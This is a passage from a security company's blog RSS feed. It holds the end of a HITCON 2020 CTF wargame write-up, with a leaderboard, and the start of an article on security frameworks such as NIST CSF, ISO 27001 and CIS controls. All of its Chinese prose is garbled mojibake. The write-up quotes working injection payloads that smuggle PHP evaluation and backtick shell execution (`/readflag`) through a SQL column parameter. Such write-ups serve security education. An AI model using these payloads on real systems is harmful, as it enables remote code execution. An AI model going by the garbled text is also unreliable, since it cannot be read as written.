&lt;p&gt;åŒæ¨£æ˜¯åˆ©ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; è£½é€ å‡º PHP çœ‹ä¸è¦‹ã€MySQL çœ‹å¾—è¦‹çš„è¨»è§£æ–‡å­—ä¾†æ§åˆ¶è³‡æ–™åº«æŸ¥è©¢çµæœï¼Œæœ€å¾Œåˆ©ç”¨ execution operator ä¾†é”æˆåŸ·è¡Œç³»çµ±æŒ‡ä»¤ï¼Œä½†ç”±æ–¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;`&lt;/code&gt; å…§çš„æ–‡å­—æœƒè¢« MySQL èªç‚ºæ˜¯ identifierï¼Œæ‰¾ä¸åˆ°å°æ‡‰è³‡æºæœƒå°è‡´éŒ¯èª¤ï¼Œæ‰€ä»¥é€éå­æŸ¥è©¢å’Œ alias èªæ³•å¼·è¡Œè£½é€ å‡º identifier è®“æŸ¥è©¢æ­£ç¢ºåŸ·è¡Œã€‚&lt;del&gt;æœ¬äººè¡¨ç¤ºä¸€é–‹å§‹è¦ºå¾—ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; æœƒå¾ˆå¸¥ï¼Œçµæœèµ°åç¹äº†ä¸€å¤§åœˆ&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by shik (https://github.com/ShikChen/)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id%2b&quot;${print_r(`/readflag`)}&quot;&amp;amp;id=1

SQL: SELECT id+&quot;${print_r(`/readflag`)}&quot; FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;id+&quot;${print_r(`/readflag`)}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è§£æ³•åˆ©ç”¨åŠ æ³•é‹ç®—å­çµ„åˆ id identifier å’Œé›™å¼•è™Ÿå­—ä¸²ï¼Œæ¥è‘—åœ¨é›™å¼•è™Ÿå­—ä¸²åˆ©ç”¨ evaluation ç‰¹æ€§åŸ·è¡Œ PHP ç¨‹å¼ç¢¼ï¼Œé€é execution operator åŸ·è¡Œç³»çµ±æŒ‡ä»¤å¾Œå†ä»¥ print_r å¼·åˆ¶è¼¸å‡ºçµæœï¼Œå–å¾— flagã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;åŒ¿å:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: id=1&amp;amp;column=id%2b&quot;${`yes`}&quot;

SQL: SELECT id+&quot;${`yes`}&quot; FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;id+&quot;${`yes`}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¦å¤–é‚„æ”¶åˆ°ä¸€å€‹åŒ¿åæäº¤çš„è§£æ³•ï¼Œæ€è·¯èˆ‡å‰é¢ç›¸åŒï¼Œç¸½ä¹‹å°±ä¹Ÿé™„ä¸Šä¾†äº†ï½ã€‚&lt;/p&gt;

&lt;h2 id=&quot;çµèª&quot;&gt;çµèª&lt;/h2&gt;

&lt;p&gt;ä»¥ä¸Šå°±æ˜¯æˆ‘å€‘é€™æ¬¡ç‚º HITCON 2020 æº–å‚™çš„ Wargame çš„å…¶ä¸­ä¸€é“é–‹æ”¾å¼é¡Œç›®çš„åˆ†äº«å’Œå¤§å®¶çš„è§£æ³•ä»‹ç´¹ï¼Œä¸çŸ¥é“å„ä½å–œä¸å–œæ­¡å‘¢ï¼Ÿ&lt;del&gt;å–œæ­¡çš„è©±è¨˜å¾—è¨‚é–±ã€æŒ‰è®šã€åˆ†äº«ä»¥åŠé–‹å•Ÿå°éˆ´éºå”·ï¼&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;é¡Œå¤–è©±ï¼Œé€™æ¬¡æˆ‘å€‘ç¸½å…±æœ‰ 5 é“ 100 åˆ†é¡Œç›®ï¼Œæ˜¯é ˜å–å°çå“çš„åŸºæœ¬æ¢ä»¶ï¼Œä½†æˆ‘å€‘é‚„æº–å‚™äº† 3 é“åƒ…æœ‰ 1 åˆ†çš„ bonus é¡Œç›®ï¼Œé¡å‹æ˜¯ 2 å€‹ web èˆ‡ 1 å€‹å”¯ä¸€çš„ pwnï¼Œè®“å¤§å®¶èƒ½é€²ä¸€æ­¥æŒ‘æˆ°é€²éšå¯¦æˆ°èƒ½åŠ›ï¼Œè€Œé€™æ¬¡æœ‰è§£é–‹è‡³å°‘ä¸€é“ bonus é¡Œçš„ç‚ºä»¥ä¸‹å…©ä½åƒåŠ è€…ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;11/14 Balsn CTF 2020 ç¸½çé‡‘åè¬å…ƒ: 502 åˆ†&lt;/li&gt;
  &lt;li&gt;FI: 501&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å‹æƒ…å·¥å•†ï¼šç”±å°ç£çŸ¥å CTF æˆ°éšŠä¹‹ä¸€çš„ Balsn èˆ‰è¾¦çš„ Balsn CTF 2020 å°‡åœ¨ 11/14 èˆ‰è¾¦ï¼Œä»–å€‘æº–å‚™äº†è±å¯Œçš„æ¯”è³½çé‡‘èˆ‡å……æ»¿å‰µæ„ã€æŠ€è¡“æ€§çš„é¡Œç›®ï¼Œæƒ³è­‰æ˜å¯¦åŠ›çš„æœ‹å‹å€‘å¯ä¸è¦éŒ¯éäº†ï¼&lt;/p&gt;

&lt;p&gt;Balsn Twitter: https://twitter.com/balsnctf/status/1316925652700889090&lt;br /&gt;
Balsn CTF 2020 on CTFtime: https://ctftime.org/event/1122/&lt;/p&gt;

&lt;p&gt;å¦å¤–çš„å¦å¤–ï¼Œæœ€å¾Œè®“æˆ‘å€‘æ­å–œ &lt;strong&gt;yuawn (https://twitter.com/_yuawn)&lt;/strong&gt; ä»¥ 1 åˆ†ä¹‹å§¿æ¦®ç² &lt;strong&gt;DEVCORE Wargame æœ€å¾Œ 1 å&lt;/strong&gt;ï¼å…¨å ´æ’è¡Œæ¦œä¸Šå”¯ä¸€å¾—åˆ†ä¸è¶…é 100 çš„åƒåŠ è€…ï¼ŒåŒæ™‚ä»–ä¹Ÿå–å¾—äº† pwn é¡Œç›®çš„é¦–æ®ºå…¼å”¯ä¸€è§£ï¼Œæ­å–œä»– ğŸ‘ğŸ‘ã€‚&lt;/p&gt;

&lt;p&gt;æœ€å¾Œé™„ä¸Šä»Šå¹´çš„å‰ååï¼Œå°±è®“æˆ‘å€‘ 2021 å¹´å†è¦‹å›‰ï½&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Place&lt;/th&gt;
      &lt;th&gt;Team&lt;/th&gt;
      &lt;th&gt;Score&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;11/14 Balsn CTF 2020 ç¸½çé‡‘åè¬å…ƒ&lt;/td&gt;
      &lt;td&gt;502&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;FI&lt;/td&gt;
      &lt;td&gt;501&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;mico&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;ankleboy&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;hans00&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;Meow&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;ginoah&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;cjiso1117&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;zodiuss&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10&lt;/td&gt;
      &lt;td&gt;dalun&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
                <link>https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020/</link>
                <guid>https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020</guid>
                <pubDate>Fri, 30 Oct 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ä½ çš„è³‡å®‰ç­–ç•¥å¤ æ˜ç¢ºå—ï¼Ÿé€éæ¡†æ¶å„ªå…ˆç·©è§£çœŸå¯¦å¨è„…</title>
                <description>&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;é€™ä¸€ç¯‡æ˜¯è·Ÿ Allen åœ¨ iThome 2020 è³‡å®‰å¤§æœƒä¸€èµ·åˆ†äº«çš„ä¸»é¡Œã€‚åœ¨åœ‹å…§ï¼Œå¤§å®¶æ¯”è¼ƒå°‘è¨è«–è³‡å®‰ç­–ç•¥é€™å€‹è­°é¡Œã€‚ä¸»è¦åŸå› é™¤äº†é€™å€‹é¡Œç›®å¤ªéè‰±æ¾€ã€ç„¡èŠå¤–ï¼Œå¾å•†æ¥­çš„è§’åº¦ä¹Ÿä¸å®¹æ˜“æˆç‚ºç²åˆ©çš„æœå‹™ã€‚è€Œæˆ‘å€‘æœƒæƒ³åˆ†äº«é€™å€‹ä¸»é¡Œçš„åŸå› èˆ‡æˆ‘å€‘ä¸»è¦çš„æœå‹™ã€Œç´…éšŠæ¼”ç·´ã€æœ‰é—œã€‚&lt;/p&gt;

&lt;p&gt;åŸ·è¡Œç´…éšŠæ¼”ç·´ä¸‰å¹´å¤šä¾†ï¼Œé›–ç„¶å”åŠ©ä¼æ¥­æ‰¾å‡ºå¨è„…ç‡Ÿé‹çš„é‡è¦å…¥ä¾µè·¯å¾‘ï¼Œç”šè‡³ç™¼ç¾é˜²ç¦¦æ©Ÿåˆ¶çš„ä¸è¶³ä¹‹è™•ï¼Œè¨±å¤šç©æ¥µçš„å®¢æˆ¶æ›´æƒ³çŸ¥é“é™¤äº†ç•¶æ¬¡ç´…éšŠæ¼”ç·´ç™¼ç¾çš„å•é¡Œå¤–ï¼Œæ˜¯ä¸æ˜¯æœ‰æ›´å‘¨å»¶çš„æ–¹å¼ä¾†ç›¤é»é˜²ç¦¦ç¾æ³çš„ä¸è¶³ã€‚å› æ­¤ï¼Œæˆ‘å€‘é–‹å§‹å°‹æ‰¾ä¸€å€‹çµæ§‹åŒ–ä¸”å®Œæ•´çš„æ–¹å¼ä¾†æ¢ç©¶é€™å€‹è­°é¡Œï¼Œé–‹å§‹æ€è€ƒåœ‹éš›æ¨™æº–ã€æ¡†æ¶èˆ‡ç´…éšŠæ¼”ç·´ä¹‹é–“çš„é—œä¿‚ã€‚å¸Œæœ›é™¤äº†å¾æ”»æ“Šè€…çš„æ€ç¶­è·ŸæŠ€å·§æ‰¾åˆ°ä¼æ¥­çš„å•é¡Œå¤–ï¼Œä¹Ÿèƒ½å¾é˜²å®ˆæ–¹çš„è§’åº¦æ€è€ƒä¼æ¥­é•·æœŸè€Œå…¨é¢çš„é˜²ç¦¦è¦åŠƒã€‚&lt;/p&gt;

&lt;h2 id=&quot;è¤‡é›œçš„å•é¡Œæ›´è¦å¾ç­–ç•¥é¢æ€è€ƒ&quot;&gt;è¤‡é›œçš„å•é¡Œï¼Œæ›´è¦å¾ç­–ç•¥é¢æ€è€ƒ&lt;/h2&gt;

&lt;p&gt;è³‡å®‰æ˜¯éå¸¸è¤‡é›œè€Œä¸”åˆ†å·¥ç´°è†©çš„å·¥ä½œï¼Œä¸ç¢ºå®šå•é¡Œçš„æ ¸å¿ƒå°±ç„¡æ³•é‡æ¸…æ¬Šè²¬ã€å®‰æ’è³‡æºï¼Œé‘è«–é™ä½å†ç™¼çš„æ©Ÿç‡ã€‚å› æ­¤è¦è§£æ±ºé€™å€‹è¤‡é›œå•é¡Œéœ€è¦æœ‰è³‡å®‰ç­–ç•¥ä¾†æ”¯æ’ï¼Œè€Œä¸æ˜¯é ­ç—›é†«é ­ã€è…³ç—›é†«è…³ã€‚é¦–å…ˆï¼Œæˆ‘å€‘æŠŠè³‡å®‰çš„é˜²è­·åˆ†ç‚ºä¸‰ç¨®éšæ®µï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ¢å¾©åŸç‹€å‹ï¼šä¼æ¥­å°‡ä¸»è¦çš„è³‡å®‰è³‡æºæŠ•æ”¾åœ¨æ—¥å¸¸çš„ç¶­é‹åŠå•é¡ŒæŸ¥æ‰¾ä¸Šï¼ŒåŒ…æ‹¬ç¢ºèªç•¶ä¸‹ç™¼ç”Ÿçš„å•é¡Œã€é€²è¡Œç·Šæ€¥è™•ç†ã€ç½å®³æ§åˆ¶ã€æŸ¥æ˜åŠåˆ†æç™¼ç”ŸåŸå› ã€ä¿®å¾©å•é¡Œã€ç ”ç©¶å°ç­–é¿å…å†ç™¼ç”Ÿç­‰ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;é˜²å¾®æœæ¼¸å‹ï¼šå°‡è³‡æºæŠ•å…¥åœ¨å°ä¼æ¥­é€ æˆé‡å¤§è¡æ“Šçš„å•é¡Œä¸Šï¼Œä¸¦æŒçºŒé€²è¡Œé é˜²åŠå›æ‡‰çš„è©•ä¼°èˆ‡æ¼”ç·´ã€å˜—è©¦æå‰æ‰¾å‡ºåŸå› ï¼ŒåŠ ä»¥é é˜²æˆ–æ€è€ƒæ¼”ç·´ç™¼ç”Ÿæ™‚æ‡‰è©²åŸ·è¡Œçš„å°ç­–ã€‚&lt;/li&gt;
  &lt;li&gt;è¿½æ±‚ç†æƒ³/å“è¶Šå‹ï¼šç›¤é»åŠåˆ†æå•é¡Œçš„å„ªã€ç¼ºé»ï¼Œè¨­å®šä¼æ¥­æŒçºŒç²¾é€²çš„ç›®æ¨™ï¼Œè—‰ç”±è¡Œå‹•è¨ˆç•«ä¾†é”æˆç›®æ¨™ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ ¹æ“šæˆ‘å€‘çš„è§€å¯Ÿï¼Œå¹¾ä¹å¤šæ•¸çš„ä¼æ¥­éƒ½æ˜¯è½åœ¨ã€Œæ¢å¾©åŸç‹€å‹ã€ï¼Œä½†ä¼æ¥­å¤šåŠèªçŸ¥å…¶ç‚ºã€Œé˜²å¾®æœæ¼¸å‹ã€ã€‚é€ æˆé€™å€‹èªçŸ¥ä¸Šçš„è½å·®ï¼Œä¸»å› ä¾†è‡ªæ–¼å°è‡ªèº«å®‰å…¨ç‹€æ³çš„ä¸äº†è§£ï¼Œå°è‡´å°æ–¼é¢¨éšªçš„æŒæ¡ç¨‹åº¦ç”¢ç”Ÿèª¤åˆ¤ã€‚å› æ­¤ï¼Œé€éä¸€å€‹å®è§€çš„ç­–ç•¥æ€è€ƒï¼Œæœ‰åŠ©æ–¼ç›¤é»å„ç¨®æ§åˆ¶æªæ–½ä¸è¶³ä¹‹è™•ï¼Œæ‰æœ‰æ©Ÿæœƒå°‡é˜²ç¦¦ç¸±æ·±çš„æ©Ÿåˆ¶æ‹´ç·Šèºçµ²ï¼Œæ‰“é€ æœŸæœ›çš„é˜²ç¦¦é«”ç³»ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;åˆ†å±¤è² è²¬å„å¸å…¶è·&quot;&gt;åˆ†å±¤è² è²¬ï¼Œå„å¸å…¶è·&lt;/h2&gt;

&lt;p&gt;æˆ‘å€‘å»ºè­°å°‡ç¸±æ·±é˜²ç¦¦ä»¥ä¸€å€‹æ›´å…¨é¢çš„æ–¹å¼ä¾†æª¢è¦–ï¼Œåˆ†ç‚º Executive Layerã€Process Layerã€Procedure Layer ä»¥åŠ Technology Layer å››å±¤ï¼Œä¸€å€‹å¥½çš„é˜²ç¦¦ç­–ç•¥ï¼Œé™¤äº†è¦åšåˆ° R &amp;amp; R (Role &amp;amp; Responsibility) å¤–ï¼Œæ›´é‡è¦çš„æ˜¯åœ¨ä¸Šè€Œä¸‹åˆ¶å®šç­–ç•¥ä¹‹å¾Œï¼Œç¶“ç”±ä¸‹è€Œä¸Šçš„æ–¹å¼ç¢ºä¿ç­–ç•¥çš„æœ‰æ•ˆæ€§ï¼Œå› æ­¤ä¸åŒéšå±¤çš„è³‡å®‰å¾æ¥­äººå“¡éƒ½æœ‰å…¶éœ€è¦é—œæ³¨çš„é‡é»ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Executive Layerï¼šè³‡å®‰é•· (CISO) çš„è¦–è§’ï¼Œé—œæ³¨è¶³ä»¥å½±éŸ¿çµ„ç¹”ç‡Ÿé‹çš„é¢¨éšªåŠç·©è§£é€™äº›é¢¨éšªçš„è³‡æºæ˜¯å¦å……è¶³ã€‚å¯ä»¥åƒè€ƒçš„æ¨™æº–åŒ…æ‹¬ NIST 800-39ã€NIST 800-30ã€ISO 27005 ä»¥åŠ CIS RAMã€‚&lt;/li&gt;
  &lt;li&gt;Process Layerï¼šé«˜éšä¸»ç®¡çš„è¦–è§’ï¼Œé—œæ³¨æŒçºŒç¶­æŒçµ„ç¹”å®‰å…¨é‹ä½œçš„ç®¡ç†ç¨‹åºæ˜¯å¦è¶³å¤ åŠè½å¯¦ã€è¦åŠƒæœªä¾†çµ„ç¹”è³‡å®‰çš„æˆç†Ÿåº¦ç­‰ã€‚åƒè€ƒçš„æ¨™æº–åŒ…æ‹¬ NIST Cybersecurity Frameworkã€ISO 27001 ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;Procedure Layerï¼šä¸­éšä¸»ç®¡çš„è¦–è§’ï¼ŒåŒ…æ‹¬æ±ºå®šå“ªäº›å®‰å…¨æ§åˆ¶æªæ–½è¦åŸ·è¡Œã€åŸ·è¡Œçš„ç´°ç·»ç¨‹åº¦ï¼Œé€™äº›é …ç›®å°±æ˜¯ä¸€èˆ¬æ‰€è¬‚çš„å®‰å…¨æ§åˆ¶æªæ–½ (security control)ï¼Œä¾‹å¦‚çµ„æ…‹è¨­å®šã€å¯†ç¢¼ç®¡ç†ã€æ—¥èªŒç´€éŒ„çš„é¡å‹ç­‰ï¼Œå¯ä»¥åƒè€ƒ NIST 800-53 æˆ–æ˜¯ CIS Critical Security Controls ç­‰è¦ç¯„ã€‚&lt;/li&gt;
  &lt;li&gt;Technology Layerï¼šåˆéšä¸»ç®¡èˆ‡æŠ€è¡“äººå“¡çš„è§’åº¦ï¼ŒåŒ…å«é‡å°æ”»æ“Šè€…çš„æŠ€å·§æ‰€æ‡‰å°çš„è³‡å®‰è¨­å‚™ã€è‡ªå‹•åŒ–å®‰å…¨æ§åˆ¶æªæ–½çš„å·¥å…·ã€ç›£æ§åˆ†æå·¥å…·ç­‰ç­‰ã€‚ç›®å‰é€™éƒ¨ä»½ä¹Ÿæ˜¯çµ„ç¹”è³‡å®‰é˜²ç¦¦çš„é‡é»ï¼Œå¯ä»¥åƒè€ƒè³‡å®‰è¨­å‚™æ”¯æ´ MITRE ATT&amp;amp;CK çš„æ”»æ“ŠæŠ€å·§ä¾†ç›¤é»ç¾æœ‰çš„é˜²ç¦¦ç¼ºå£æˆ–é€é OWASP Cyber Defense Matrix (CDM) å®šä½ç”¢å“ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;æ¡†æ¶èˆ‡æ¨™æº–çš„å®šä½&quot;&gt;æ¡†æ¶èˆ‡æ¨™æº–çš„å®šä½&lt;/h2&gt;

&lt;p&gt;åœ¨èªªæ˜å®Œä¸åŒéšå±¤é—œæ³¨çš„é‡é»å¾Œï¼Œé€™è£¡ç‰¹åˆ¥èªªæ˜å¹¾å€‹é‡è¦ (æˆ–ä½¿ç”¨ç‡è¼ƒé«˜) çš„æ¨™æº–åŠæ¡†æ¶ã€‚é™¤äº†è¦çŸ¥é“å“ªäº›æ¡†æ¶è·Ÿæ¨™æº–èˆ‡è³‡å®‰æœ‰é—œå¤–ï¼ŒåŒæ™‚ä¹Ÿéœ€è¦äº†è§£é©ç”¨çš„æƒ…å¢ƒã€ç›®çš„åŠå½¼æ­¤é–“çš„å·®ç•°&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ISO 27001ï¼šå±¬æ–¼ Process Layerï¼Œå…¶æä¾›å»ºç«‹è³‡è¨Šå®‰å…¨ç®¡ç†ç³»çµ±çš„æ¨™æº–ï¼Œå¹«åŠ©çµ„ç¹”ç®¡ç†å’Œä¿è­·è³‡è¨Šè³‡ç”¢ï¼Œç¢ºä¿é”åˆ°å®¢æˆ¶æˆ–åˆ©å®³é—œä¿‚äººå…¶å®‰å…¨çš„æœŸå¾…ï¼›å¯ä»¥å–å¾—é©—è­‰ã€‚ä½†è¦æé†’çš„æ˜¯ï¼Œ27001 ä½œç‚ºä¸€å€‹å¯¦è¸è³‡è¨Šå®‰å…¨ç®¡ç† (Information Security System) çš„æ¨™æº–ï¼Œé›–ç„¶å…·æœ‰æ–‡ä»¶åŒ– (Documented) è¦æ±‚çš„å„ªé»ï¼Œä½†å…¶è¦æ±‚é …ç›®å¤šæ•¸åœ¨é é˜² (Prevent) åŠé¿å… (Avoid) ä¸Šï¼Œè¼ƒå°‘è‘—é‡åœ¨å› æ‡‰ç¶²è·¯å®‰å…¨çš„åµæ¸¬ (Detect) åŠå›æ‡‰ (React) ä¸Šã€‚&lt;/li&gt;
  &lt;li&gt;NIST Cybersecurity Framework (CSF)ï¼šå±¬æ–¼ Process Viewï¼Œç”±ç¾åœ‹ä¸»å°çš„ç¶²è·¯å®‰å…¨æ¡†æ¶ï¼Œæä¾›é—œéµåŸºç¤è¨­æ–½æˆ–ä¸€èˆ¬ä¼æ¥­å¹«åŠ©çµ„ç¹”ç®¡ç†å’Œä¿è­·è³‡è¨Šè³‡ç”¢ï¼Œç¢ºä¿å…¶å®‰å…¨ç„¡æ…®ï¼›å¯ä»¥é©—è­‰ä¸¦æœ‰æˆç†Ÿåº¦æ¨¡å¼ï¼Œå¯ä»¥è®“ä¼æ¥­å…ˆæç¹ªè‡ªå·±çš„è³‡å®‰ç‹€æ…‹ (profile) ä¸¦è—‰ç”±è¨‚å®šç›®æ¨™é€å¹´å¼·åŒ–ä¼æ¥­çš„å®‰å…¨ã€‚åŒæ™‚ï¼Œæ˜ç¢ºçš„å°‡å®‰å…¨è¦æ±‚çµæ§‹åŒ–çš„åˆ†æˆè­˜åˆ¥ (Identify)ã€é˜²ç¦¦ (Protect)ã€åµæ¸¬ (Detect)ã€å›æ‡‰ (Respond) åŠå¾©åŸ (Recover)ï¼Œä¸¦æ”¯æ´å…¶ä»–å®‰å…¨æ¨™æº–èˆ‡æ¡†æ¶çš„å°æ‡‰ï¼Œå¦‚ CIS CSCã€COBITã€27001ã€NIST 800-53 ç­‰ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CIS Cybersecurity Controlï¼šè³‡è¨Šå®‰å…¨æ§åˆ¶æŒ‡å¼•å±¬æ–¼ Procedure Viewï¼Œé‡å°ç¶²è·¯æ”»æ“Šæ‰€æ‡‰æ¡å–çš„æ§åˆ¶é …ç›®æå‡ºå„ªå…ˆåŸ·è¡Œé †åºï¼Œçµ„ç¹”å¯ä¾ç…§è‡ªèº«çš„è¦æ¨¡ (IG1-IG3) åŸ·è¡Œå°æ‡‰çš„æªæ–½ï¼Œ åˆ†ç‚ºåŸºç¤å‹ã€åŸºæœ¬å‹åŠçµ„ç¹”å‹ï¼Œå…± 20 å€‹æ§åˆ¶ç¾¤çµ„ã€178 å€‹å­æ§åˆ¶é …ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ä¸è‰¯çš„è³‡å®‰é˜²è­·ç‹€æ…‹&quot;&gt;ä¸è‰¯çš„è³‡å®‰é˜²è­·ç‹€æ…‹&lt;/h2&gt;

&lt;p&gt;å¯¦å‹™ä¸Šä¾†èªªï¼Œä¼æ¥­çš„é˜²ç¦¦ç­–ç•¥æœ‰å…©ç¨®ä¸è‰¯çš„ç‹€æ…‹&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç¸±æ·±é˜²è­·ä¸è¶³ï¼šé˜²ç¦¦æ©Ÿåˆ¶ä¸å¤ å…¨é¢ (ç´…è‰²ç¼ºå£)ã€è¨­å‚™æ•ˆæœä¸å¦‚å®£ç¨± (è—è‰²ç¼ºå£)ã€è¨­å‚™æœ¬èº«çš„é™åˆ¶ (æ©˜è‰²ç¼ºå£)ï¼›ä¸Šè¿°çš„å•é¡Œï¼Œç¶œåˆè€Œè¨€ï¼Œå°±æœƒä½¿å¾—è¨­å‚™é–“çš„ç¶œæ•ˆç„¡æ³•é˜»æ–·æ”»æ“Šéˆï¼Œå½¢æˆæŠ€è¡“å±¤çš„ç ´å£ã€‚&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20201013/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;é…å¥—æªæ–½çš„ä¸å®Œæ•´ï¼šä¹Ÿå°±æ˜¯ã€Œç¨‹åºã€åŠã€Œæµç¨‹ã€ä¸Šçš„ä¸è¶³ï¼Œå‡è¨­æŸè³‡å®‰è¨­å‚™å¯ä»¥åµæ¸¬åˆ°ç•°å¸¸è¡Œç‚ºï¼Œè³‡å®‰äººå“¡å¦‚ä½•åˆ†è¾¨é€™æ˜¯æ”»æ“Šè¡Œç‚ºé‚„æ˜¯å“¡å·¥å…§éƒ¨æ­£å¸¸è¡Œç‚ºï¼Ÿå¤šä¹…å…§è¦åŠæ™‚å›æ‡‰é€²è¡Œè™•ç†ã€å¤šä¹…è¦ç™¼å‹•é‘‘è­˜ï¼Ÿä¸€æ—¦ä¸Šè¿°çš„ã€Œç¨‹åºã€åŠã€Œæµç¨‹ã€æ²’æœ‰å®šç¾©æ¸…æ¥šï¼Œç¸±ä½¿è¨­å‚™æœ¬èº«æ˜¯æœ‰æ•ˆçš„ï¼Œçµ„ç¹”ä»ç„¶æœƒå› ç‚ºå›æ‡‰æ™‚é–“éæ…¢ï¼Œå°è‡´æ”»æ“Šè€…å…¥ä¾µæˆåŠŸã€‚&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20201013/5.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;ç›¤é»å„å±¤æ¬¡çš„å®ˆå‚™ç¯„åœ&quot;&gt;ç›¤é»å„å±¤æ¬¡çš„å®ˆå‚™ç¯„åœ&lt;/h2&gt;

&lt;p&gt;é‚£éº¼è¦å¦‚ä½•æ”¹å–„é€™å…©ç¨®ä¸ä½³çš„é˜²ç¦¦ç‹€æ…‹ï¼Ÿæˆ‘å€‘å¯ä»¥å–®ç¨ä½¿ç”¨ CDM ä¾†è©•ä¼°æŠ€è¡“å±¤çš„å®ˆå‚™ç¯„åœæ˜¯å¦è¶³å¤ ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å®ƒä¾†ä½œç‚ºç¨‹åºã€æµç¨‹åŠæŠ€è¡“å±¤çš„è·¨éšå±¤çš„ç›¤é»ï¼›&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CDM (Cyber Defense Matrix) æ˜¯ OWASP çš„ä¸€å€‹å°ˆæ¡ˆï¼Œç”±ä¸€å€‹ 5x5 çš„çŸ©é™£æ‰€æ§‹æˆã€‚æ©«è»¸æ˜¯ NIST CSF çš„äº”å¤§é¡åˆ¥ï¼Œè€Œç¸±è»¸å‰‡æ˜¯è³‡ç”¢ç›¤é»å¸¸è¦‹çš„åˆ†é¡ï¼›çµ„ç¹”å¯ä»¥åˆ©ç”¨é€™å€‹çŸ©é™£ä¾†ç›¤é»ä¼æ¥­ Technology View å»ºæ§‹çš„é˜²ç¦¦è¨­å‚™ï¼Œæ›´ç²¾æº–çš„ç¢ºèªéœ€è¦ä¿è­·çš„è³‡ç”¢æ˜¯å¦åœ¨ NIST CSF çš„æ¯å€‹é¡åˆ¥éƒ½æœ‰å°æ‡‰çš„æªæ–½ã€‚&lt;/p&gt;
